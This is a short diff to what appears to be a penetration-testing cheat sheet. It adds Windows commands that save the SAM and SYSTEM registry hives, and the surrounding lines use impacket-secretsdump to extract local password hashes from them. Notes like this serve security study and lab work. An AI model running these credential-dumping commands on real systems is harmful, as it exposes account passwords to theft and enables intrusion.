@@ -1619,6 +1619,11 @@ dir /s SYSTEM
 ```
 
 - Obtaining Hashes from SYSTEM and SAM
+```bash
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+```
+-Cracking the hashes 
 
 ```bash
 impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
